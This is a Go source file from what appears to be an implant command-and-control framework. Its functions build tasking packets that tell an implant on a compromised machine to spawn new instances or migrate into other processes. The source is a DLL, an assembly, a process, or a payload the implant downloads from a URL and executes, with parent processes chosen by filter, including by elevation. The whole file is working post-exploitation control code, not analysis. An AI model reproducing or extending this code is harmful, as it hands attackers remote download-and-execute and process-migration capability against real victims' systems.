//go:build !implant

package task

import (
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com"
)

var (
	_ Callable = (*DLL)(nil)
	_ Callable = (*Zombie)(nil)
	_ Callable = (*Process)(nil)
	_ Callable = (*Assembly)(nil)
)

// SpawnPull will attempt to spawn a new instance using the provided URL as the
// source.
//
// The provided Filter specifies the parent of the new instance and the 's'
// argument string specifies the pipe name to use while connecting.
//
// The return result is the PID of the new instance.
//
// This function uses the same Profile as the target Session. Use the
// 'SpawnPullProfile' function to change this behavior.
//
// The download data may be saved in a temporary location depending on what the
// resulting data type is or file extension. (see 'man.ParseDownloadHeader')
//
// C2 Details:
//  ID: MvSpawn
//
//  Input:
//      string          // Pipe Name
//      []byte          // Profile Bytes
//      Filter struct { // Filter
//          bool        // Filter Status
//          uint32      // PID
//          bool        // Fallback
//          uint8       // Session
//          uint8       // Elevated
//          []string    // Exclude
//          []string    // Include
//      }
//      uint8           // Callable Type (always TvPullExecute)
//      string          // URL
//  Output:
//      uint32          // New PID
func SpawnPull(f *filter.Filter, s, url string) *com.Packet {
	return SpawnPullProfile(f, s, nil, url)
}

// MigratePull will attempt to migrate to a new instance using the provided URL
// as the source.
//
// The provided Filter specifies the parent of the new instance and the 's'
// argument string specifies the pipe name to use while connecting.
//
// This function keeps the same Profile. Use the 'MigratePullProfile' or
// 'MigratePullProfileEx' function to change this behavior.
//
// This function will automatically wait for all Jobs to complete. Use the
// 'MigratePullProfileEx' function to change this behavior.
//
// The download data may be saved in a temporary location depending on what the
// resulting data type is or file extension. (see 'man.ParseDownloadHeader')
//
// C2 Details:
//  ID: MvMigrate
//
//  Input:
//      bool            // Wait for Jobs
//      string          // Pipe Name
//      []byte          // Profile Bytes
//      Filter struct { // Filter
//          bool        // Filter Status
//          uint32      // PID
//          bool        // Fallback
//          uint8       // Session
//          uint8       // Elevated
//          []string    // Exclude
//          []string    // Include
//      }
//      uint8           // Callable Type (always TvPullExecute)
//      string          // URL
//  Output:
//      <none>          // RvMigrate packet sent separately
func MigratePull(f *filter.Filter, s, url string) *com.Packet {
	return MigratePullProfileEx(f, true, s, nil, url)
}

// Spawn will attempt to spawn a new instance using the provided Callable type
// as the source.
//
// The provided Filter specifies the parent of the new instance and the 's'
// argument string specifies the pipe name to use while connecting.
//
// The return result is the PID of the new instance.
//
// This function uses the same Profile as the target Session. Use the
// 'SpawnProfile' function to change this behavior.
//
// C2 Details:
//  ID: MvSpawn
//
//  Input:
//      string          // Pipe Name
//      []byte          // Profile Bytes
//      Filter struct { // Filter
//          bool        // Filter Status
//          uint32      // PID
//          bool        // Fallback
//          uint8       // Session
//          uint8       // Elevated
//          []string    // Exclude
//          []string    // Include
//      }
//      uint8           // Callable Type
//      <...>           // Callable Data
//  Output:
//      uint32          // New PID
func Spawn(f *filter.Filter, s string, c Callable) *com.Packet {
	return SpawnProfile(f, s, nil, c)
}

// Migrate will attempt to migrate to a new instance using the provided Callable
// type as the source.
//
// The provided Filter specifies the parent of the new instance and the 's'
// argument string specifies the pipe name to use while connecting.
//
// This function keeps the same Profile. Use the 'MigrateProfile' or
// 'MigrateProfileEx' function to change this behavior.
//
// This function will automatically wait for all Jobs to complete. Use the
// 'MigrateProfileEx' function to change this behavior.
//
// C2 Details:
//  ID: MvMigrate
//
//  Input:
//      bool            // Wait for Jobs
//      string          // Pipe Name
//      []byte          // Profile Bytes
//      Filter struct { // Filter
//          bool        // Filter Status
//          uint32      // PID
//          bool        // Fallback
//          uint8       // Session
//          uint8       // Elevated
//          []string    // Exclude
//          []string    // Include
//      }
//      uint8           // Callable Type
//      <...>           // Callable Data
//  Output:
//      <none>          // RvMigrate packet sent separately
func Migrate(f *filter.Filter, s string, c Callable) *com.Packet {
	return MigrateProfileEx(f, true, s, nil, c)
}

// SpawnProfile will attempt to spawn a new instance using the provided Callable
// type as the source with the supplied Profile bytes.
//
// The provided Filter specifies the parent of the new instance and the 's'
// argument string specifies the pipe name to use while connecting.
//
// The return result is the PID of the new instance.
//
// If the 'b' Profile bytes is nil or empty, the current target Session Profile
// will be used.
//
// C2 Details:
//  ID: MvSpawn
//
//  Input:
//      string          // Pipe Name
//      []byte          // Profile Bytes
//      Filter struct { // Filter
//          bool        // Filter Status
//          uint32      // PID
//          bool        // Fallback
//          uint8       // Session
//          uint8       // Elevated
//          []string    // Exclude
//          []string    // Include
//      }
//      uint8           // Callable Type
//      <...>           // Callable Data
//  Output:
//      uint32          // New PID
func SpawnProfile(f *filter.Filter, s string, b []byte, c Callable) *com.Packet {
	n := &com.Packet{ID: MvSpawn}
	n.WriteString(s)
	n.WriteBytes(b)
	if f.MarshalStream(n); c == nil {
		n.WriteUint8(0)
		return n
	}
	n.WriteUint8(c.task())
	c.MarshalStream(n)
	return n
}

// MigrateProfile will attempt to migrate to a new instance using the provided
// Callable type as the source with the supplied Profile bytes.
//
// The provided Filter specifies the parent of the new instance and the 's'
// argument string specifies the pipe name to use while connecting.
//
// If the 'b' Profile bytes is nil or empty, the current target Session Profile
// will be used.
//
// This function will automatically wait for all Jobs to complete. Use the
// 'MigrateProfileEx' function to change this behavior.
//
// C2 Details:
//  ID: MvMigrate
//
//  Input:
//      bool            // Wait for Jobs
//      string          // Pipe Name
//      []byte          // Profile Bytes
//      Filter struct { // Filter
//          bool        // Filter Status
//          uint32      // PID
//          bool        // Fallback
//          uint8       // Session
//          uint8       // Elevated
//          []string    // Exclude
//          []string    // Include
//      }
//      uint8           // Callable Type
//      <...>           // Callable Data
//  Output:
//      <none>          // RvMigrate packet sent separately
func MigrateProfile(f *filter.Filter, s string, b []byte, c Callable) *com.Packet {
	return MigrateProfileEx(f, true, s, b, c)
}

// SpawnPullProfile will attempt to spawn a new instance using the provided URL
// as the source with the supplied Profile bytes.
//
// The provided Filter specifies the parent of the new instance and the 's'
// argument string specifies the pipe name to use while connecting.
//
// The return result is the PID of the new instance.
//
// If the 'b' Profile bytes is nil or empty, the current target Session Profile
// will be used.
//
// The download data may be saved in a temporary location depending on what the
// resulting data type is or file extension. (see 'man.ParseDownloadHeader')
//
// C2 Details:
//  ID: MvSpawn
//
//  Input:
//      string          // Pipe Name
//      []byte          // Profile Bytes
//      Filter struct { // Filter
//          bool        // Filter Status
//          uint32      // PID
//          bool        // Fallback
//          uint8       // Session
//          uint8       // Elevated
//          []string    // Exclude
//          []string    // Include
//      }
//      uint8           // Callable Type (always TvPullExecute)
//      string          // URL
//  Output:
//      uint32          // New PID
func SpawnPullProfile(f *filter.Filter, s string, b []byte, url string) *com.Packet {
	n := &com.Packet{ID: MvSpawn}
	n.WriteString(s)
	n.WriteBytes(b)
	f.MarshalStream(n)
	n.WriteUint8(TvPullExecute)
	n.WriteString(url)
	return n
}

// MigratePullProfile will attempt to migrate to a new instance using the
// provided URL as the source with the supplied Profile bytes.
//
// The provided Filter specifies the parent of the new instance and the 's'
// argument string specifies the pipe name to use while connecting.
//
// If the 'b' Profile bytes is nil or empty, the current target Session Profile
// will be used.
//
// This function will automatically wait for all Jobs to complete. Use the
// 'MigratePullProfileEx' function to change this behavior.
//
// The download data may be saved in a temporary location depending on what the
// resulting data type is or file extension. (see 'man.ParseDownloadHeader')
//
// C2 Details:
//  ID: MvMigrate
//
//  Input:
//      bool            // Wait for Jobs
//      string          // Pipe Name
//      []byte          // Profile Bytes
//      Filter struct { // Filter
//          bool        // Filter Status
//          uint32      // PID
//          bool        // Fallback
//          uint8       // Session
//          uint8       // Elevated
//          []string    // Exclude
//          []string    // Include
//      }
//      uint8           // Callable Type (always TvPullExecute)
//      string          // URL
//  Output:
//      <none>          // RvMigrate packet sent separately
func MigratePullProfile(f *filter.Filter, s string, b []byte, url string) *com.Packet {
	return MigratePullProfileEx(f, true, s, b, url)
}

// MigrateProfileEx will attempt to migrate to a new instance using the provided
// Callable type as the source with the supplied Profile bytes and the 'w' boolean
// to specify waiting for Jobs to complete.
//
// The provided Filter specifies the parent of the new instance and the 's'
// argument string specifies the pipe name to use while connecting.
//
// If the 'b' Profile bytes is nil or empty, the current target Session Profile
// will be used.
//
// C2 Details:
//  ID: MvMigrate
//
//  Input:
//      bool            // Wait for Jobs
//      string          // Pipe Name
//      []byte          // Profile Bytes
//      Filter struct { // Filter
//          bool        // Filter Status
//          uint32      // PID
//          bool        // Fallback
//          uint8       // Session
//          uint8       // Elevated
//          []string    // Exclude
//          []string    // Include
//      }
//      uint8           // Callable Type
//      <...>           // Callable Data
//  Output:
//      <none>          // RvMigrate packet sent separately
func MigrateProfileEx(f *filter.Filter, w bool, s string, b []byte, c Callable) *com.Packet {
	n := &com.Packet{ID: MvMigrate}
	n.WriteBool(w)
	n.WriteString(s)
	n.WriteBytes(b)
	if f.MarshalStream(n); c == nil {
		n.WriteUint8(0)
		return n
	}
	n.WriteUint8(c.task())
	c.MarshalStream(n)
	return n
}

// MigratePullProfileEx will attempt to migrate to a new instance using the
// provided URL as the source with the supplied Profile bytes and the 'w' boolean
// to specify waiting for Jobs to complete.
//
// The provided Filter specifies the parent of the new instance and the 's'
// argument string specifies the pipe name to use while connecting.
//
// If the 'b' Profile bytes is nil or empty, the current target Session Profile
// will be used.
//
// The download data may be saved in a temporary location depending on what the
// resulting data type is or file extension. (see 'man.ParseDownloadHeader')
//
// C2 Details:
//  ID: MvMigrate
//
//  Input:
//      bool            // Wait for Jobs
//      string          // Pipe Name
//      []byte          // Profile Bytes
//      Filter struct { // Filter
//          bool        // Filter Status
//          uint32      // PID
//          bool        // Fallback
//          uint8       // Session
//          uint8       // Elevated
//          []string    // Exclude
//          []string    // Include
//      }
//      uint8           // Callable Type (always TvPullExecute)
//      string          // URL
//  Output:
//      <none>          // RvMigrate packet sent separately
func MigratePullProfileEx(f *filter.Filter, w bool, s string, b []byte, url string) *com.Packet {
	n := &com.Packet{ID: MvMigrate}
	n.WriteBool(w)
	n.WriteString(s)
	n.WriteBytes(b)
	f.MarshalStream(n)
	n.WriteUint8(TvPullExecute)
	n.WriteString(url)
	return n
}
